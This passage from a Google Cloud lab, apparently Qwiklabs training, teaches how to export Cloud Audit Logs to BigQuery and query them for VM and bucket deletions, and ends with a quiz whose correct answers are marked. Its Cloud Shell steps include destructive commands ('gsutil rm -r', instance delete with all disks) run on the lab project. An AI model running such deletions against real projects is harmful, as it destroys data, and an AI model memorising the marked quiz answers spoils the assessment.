class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud logging read \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"logName=projects/$DEVSHELL_PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">AND protoPayload.serviceName=storage.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">AND protoPayload.methodName=storage.buckets.delete"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-4-export-the-audit-logs'><span>Task 4. Export the audit logs</span></h4><p><span>In this task, you export audit logs. Individual audit log entries are kept for a specified length of time and are then deleted. The Cloud Logging </span><a href='https://cloud.google.com/logging/quotas'><span>Quota Policy</span></a><span> explains how long log entries are retained. You cannot otherwise delete or modify audit logs or their entries.</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><strong><span>Audit log type</span></strong></th><th style='text-align:left;' ><strong><span>Retention period</span></strong></th></tr></thead><tbody><tr><td style='text-align:left;' ><code>Admin Activity</code></td><td style='text-align:left;' ><code>400 days</code></td></tr><tr><td style='text-align:left;' ><code>Data Access</code></td><td style='text-align:left;' ><code>30 days</code></td></tr></tbody></table></figure><p><span>For longer retention, you can export audit log entries like any other Cloud Logging log entries and keep them for as long as you wish.</span></p><h5 id='export-audit-logs'><span>Export audit logs</span></h5><p><span>When exporting logs, the current filter will be applied to what is exported.</span></p><ol start='' ><li><p><span>In Logs Explorer, enter a query string in the </span><strong><span>Query builder</span></strong><span> to display all the audit logs. (This can be done by deleting all lines in the filter except the first one.) Your filter will look like what is shown below. (Note that your project ID will be different.)</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">logName = ("projects/[PROJECT_ID]/logs/cloudaudit.googleapis.com%2Factivity")</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Run Query</span></strong><span> button.</span></p></li><li><p><span>Click on </span><strong><span>Actions &gt; Create Sink</span></strong><span> button.</span></p></li><li><p><span>For the </span><strong><span>Sink Name</span></strong><span> name, enter </span><code>AuditLogsExport</code><span> and click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Sink service</span></strong><span>, enter </span><code>BigQuery dataset</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Select BigQuery dataset</span></strong><span> and then select </span><strong><span>Create new BigQuery dataset</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Dataset ID</span></strong><span>, enter </span><code>auditlogs_dataset</code><span> and click </span><strong><span>Create Dataset</span></strong><span>.</span></p></li><li><p><span>Uncheck the </span><strong><span>Use Partitioned Tables</span></strong><span> checkbox, if it is already selected, and click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>In the Build inclusion filter list box, make sure that this filter text is entered </span><code>logName = (&quot;projects/[PROJECT_ID]/logs/cloudaudit.googleapis.com%2Factivity&quot;)</code><span>.</span></p></li><li><p><span>Click the </span><strong><span>Create Sink</span></strong><span> button. The Logs Router Sinks page appears. Now, click on </span><strong><span>Logs Router</span></strong><span>.</span></p></li></ol><p><span>On this page, you should be able to see the AuditLogsExport sink.</span></p><ol start='' ><li><p><span>To the right of the AuditLogsExport sink, click the button with three dots (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More icon"><span>) and select </span><strong><span>View sink details</span></strong><span>.</span></p></li></ol><p><span>This will show information about the sink that you created.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Cancel</span></strong><span> when done.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You could also export log entries to Pub/Sub or Cloud Storage. Exporting to Pub/Sub can be useful if you want to flow through an ETL process prior to storing in a database </span><strong><span>(Cloud Operations &gt; PubSub &gt; Dataflow &gt; BigQuery/Bigtable)</span></strong><span>. Exporting to Cloud Storage will batch up entries and write them into Cloud Storage objects approximately once an hour.</span></p><p><strong><span>Note:</span></strong><span> All future logs will now be exported to BigQuery and the BigQuery tools can be used to perform analysis on the audit log data. The export does not export existing log entries.</span></p><ol start='' ><li><p><span>In Cloud Shell, run the following commands to generate some more activity that you will view in the audit logs exported to BigQuery:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb gs://$DEVSHELL_PROJECT_ID</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb gs://$DEVSHELL_PROJECT_ID-test</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "this is another sample file" &gt; sample2.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp sample.txt gs://$DEVSHELL_PROJECT_ID-test</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete --zone=us-east4-c \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--delete-disks=all default-us-vm</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>When prompted, enter </span><code>y</code><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil rm -r gs://$DEVSHELL_PROJECT_ID</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil rm -r gs://$DEVSHELL_PROJECT_ID-test</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-5-use-bigquery-to-analyze-logs'><span>Task 5. Use BigQuery to analyze logs</span></h4><p><span>In this task, you export logs to a BigQuery dataset. You then analyze the logs using Query editor.</span></p><p><strong><span>Note:</span></strong><span> When you export logs to a BigQuery dataset, Cloud Logging creates dated tables to hold the exported log entries. Log entries are placed in tables whose names are based on the entries&#39; log names.</span></p><ol start='' ><li><p><span>Go to </span><strong><span>Navigation menu &gt; BigQuery</span></strong><span>. If prompted, log in with the Qwiklabs-provided credentials.</span></p></li><li><p><span>The </span><em><span>Welcome to BigQuery in the Cloud Console</span></em><span> message box opens. This message box provides a link to the quickstart guide and lists UI updates.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>In the left pane, under the </span><strong><span>Explorer</span></strong><span> section, click your project. This starts with </span><code>(qwiklabs-gcp-xxx)</code><span>. You should see an </span><strong><span>auditlogs_dataset</span></strong><span> dataset under it.</span></p></li><li><p><span>Verify that the BigQuery dataset has appropriate permissions to allow the export writer to store log entries. Click on the </span><strong><span>auditlogs_dataset</span></strong><span> dataset.</span></p></li><li><p><span>From the </span><strong><span>Sharing</span></strong><span> dropdown, select </span><strong><span>Permissions</span></strong><span>.</span></p></li><li><p><span>On the Dataset Permission page, you will see the service account listed as </span><strong><span>BigQuery Data Editor</span></strong><span> member. If it&#39;s not already listed, you can add a service account under </span><strong><span>Add Principal</span></strong><span> and grant it the data editor role.</span></p></li></ol><p><img src="images\x8Ajmkj2uxvEjCGzcLWpWDjfinG656uLnPx5AmBuvME%3D" referrerpolicy="no-referrer" alt="Dataset permissions page"></p><ol start='' ><li><p><span>Click the </span><strong><span>Close</span></strong><span> button to close the </span><strong><span>Share Dataset</span></strong><span> screen.</span></p></li><li><p><span>Expand the </span><strong><span>dataset</span></strong><span> to see the table with your exported logs. (Click on the expand icon to expand the dataset.)</span></p></li><li><p><span>Click on the </span><strong><span>table name</span></strong><span> and take a moment to review the </span><strong><span>schemas</span></strong><span> and </span><strong><span>details</span></strong><span> of the tables that are being used.</span></p></li><li><p><span>Click the </span><strong><span>Query &gt; In new tab</span></strong><span> button.</span></p></li><li><p><span>In Cloud Shell, run the following commands again to generate some more activity that you will view in the audit logs exported to BigQuery:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-us-vm \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east4-c --network=mynetwork</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete --zone=us-east4-c \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--delete-disks=all default-us-vm</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>When prompted, enter </span><code>y</code><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb gs://$DEVSHELL_PROJECT_ID</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb gs://$DEVSHELL_PROJECT_ID-test</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil rm -r gs://$DEVSHELL_PROJECT_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil rm -r gs://$DEVSHELL_PROJECT_ID-test</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Delete the text provided in the </span><strong><span>Query editor</span></strong><span> window and paste in the query below. This query will return the users that deleted virtual machines in the last 7 days.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#standardSQL</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  timestamp,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resource.labels.instance_id,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protopayload_auditlog.authenticationInfo.principalEmail,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protopayload_auditlog.resourceName,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protopayload_auditlog.methodName</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">`auditlogs_dataset.cloudaudit_googleapis_com_activity_*`</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  PARSE_DATE('%Y%m%d', _TABLE_SUFFIX) BETWEEN</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY) AND</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  CURRENT_DATE()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  AND resource.type = "gce_instance"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  AND operation.first IS TRUE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  AND protopayload_auditlog.methodName = "v1.compute.instances.delete"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ORDER BY</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  timestamp,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resource.labels.instance_id</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">LIMIT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  1000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 473px;"></div><div class="CodeMirror-gutters" style="display: none; height: 473px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Run</span></strong><span> button. After a couple of seconds you will see each time someone deleted a virtual machine within the past 7 days. You should see two entries, which is the activity you generated in this lab. Remember, BigQuery is only showing activity since the export was created.</span></p></li><li><p><span>Delete the text in the </span><strong><span>Query_editor</span></strong><span> window and paste in the query below. This query will return the users that deleted storage buckets in the last 7 days.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#standardSQL</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  timestamp,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resource.labels.bucket_name,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protopayload_auditlog.authenticationInfo.principalEmail,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protopayload_auditlog.resourceName,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protopayload_auditlog.methodName</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">`auditlogs_dataset.cloudaudit_googleapis_com_activity_*`</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  PARSE_DATE('%Y%m%d', _TABLE_SUFFIX) BETWEEN</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  DATE_SUB(CURRENT_DATE(), INTERVAL 7 DAY) AND</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  CURRENT_DATE()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  AND resource.type = "gcs_bucket"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  AND protopayload_auditlog.methodName = "storage.buckets.delete"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ORDER BY</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  timestamp,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resource.labels.instance_id</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">LIMIT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  1000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 450px;"></div><div class="CodeMirror-gutters" style="display: none; height: 450px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Run</span></strong><span> button. After a couple seconds you will see entries showing each time someone deleted a storage bucket within the past 7 days.</span></p></li></ol><p><strong><span>Note:</span></strong><span> As you can see, the ability to analyze audit logs in BigQuery is very powerful. In this activity, you viewed just two examples of querying audit logs.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Export audit logs and use BigQuery to analyze logs</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='congratulations-20'><span>Congratulations!</span></h4><p><span>In this lab, you have done the following:</span></p><ol start='' ><li><p><span>Viewed audit logs on the activity page.</span></p></li><li><p><span>Viewed and filtered audit logs in Cloud Operations.</span></p></li><li><p><span>Retrieved log entries with </span><code>gcloud</code><span>.</span></p></li><li><p><span>Exported audit logs.</span></p></li></ol><p>&nbsp;</p><h3 id='quiz-25'><span>QUIZ</span></h3><ol start='' ><li><p><span>Which one of the following is NOT a benefit for automating security in Google Cloud environments?</span></p></li></ol><ul><li><p><span>Security automation allows scaling faster than the growth of threats and assets.</span></p></li><li><p><span>Security automation Improves consistency, quickness, and reliability.</span></p></li><li><p><strong><span>While beneficial in some situations, the time invested in automating certain tasks is not worth it due to a lack of Google Cloud services that support this framework.</span></strong></p><p><span>Correct! Investing in automation can save a significant amount of time and Google Cloud offers many services for automation, including Security Command Center, Web Security Scanner, and Artifact Registry.</span></p></li><li><p><span>Once you have encapsulated some task in automation, anyone can execute the task.</span></p></li></ul><ol start='2' ><li><p><span>Which TWO of the following statements about Cloud Audit Logs are TRUE?</span></p></li></ol><ul><li><p><strong><span>Enabling Data Access audit logs might result in your project being charged for the additional logs usage.</span></strong></p><p><span>Correct! These logs are disabled by default because they can become quite large and incur extra charges.</span></p></li><li><p><span>Unlike Cloud Logging logs, you cannot export Cloud Audit Logs entries to BigQuery.</span></p></li><li><p><span>Data Access audit logs record data-access operations on resources that are publicly shared.</span></p></li><li><p><strong><span>Cloud Audit Logs maintains four audit logs for each project, folder, and organization.</span></strong></p></li><li><p><span>Correct! The four audit logs maintained are “Admin Activity logs”, “System Event logs”, “Data Access logs”, and “Policy Denied logs.”</span></p><p>&nbsp;</p></li></ul><ol start='3' ><li><p><span>Which one of the following statements about Security Command Center is NOT true?</span></p></li></ol><ul><li><p><span>Security Command Center helps you prevent, detect, and respond to threats.</span></p></li><li><p><strong><span>Security Command Center requires three IAM administrative permissions to set up</span></strong></p></li><li><p><span>Security Command Center provides a centralized view for cloud resources.</span></p></li><li><p><span>Security Command Center works by generating “findings” associated 